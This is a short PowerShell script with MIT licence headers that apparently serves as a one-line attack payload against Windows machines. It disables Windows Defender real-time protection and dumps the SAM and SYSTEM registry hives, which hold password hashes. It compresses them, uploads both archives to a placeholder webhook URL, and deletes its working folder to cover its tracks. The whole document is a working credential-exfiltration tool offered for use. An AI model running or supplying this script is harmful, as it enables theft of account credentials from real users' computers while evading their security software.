# Author:  mrpanda_bamboo
# Version: 1.2
# License: MIT

Set-MpPreference -DisableRealtimeMonitoring $true;$webhook='REPLACE_WITH_WEBHOOK_URL';mkdir C:\t -Force;reg save HKLM\SAM C:\t\S.dat /y;reg save HKLM\SYSTEM C:\t\Y.dat /y;Compress-Archive C:\t\S.dat C:\t\S.zip -Force;(New-Object System.Net.WebClient).UploadFile($webhook,'C:/t/S.zip');Compress-Archive C:\t\Y.dat C:\t\Y.zip -Force;(New-Object System.Net.WebClient).UploadFile($webhook,'C:/t/Y.zip');Remove-Item C:\t -Recurse -Force
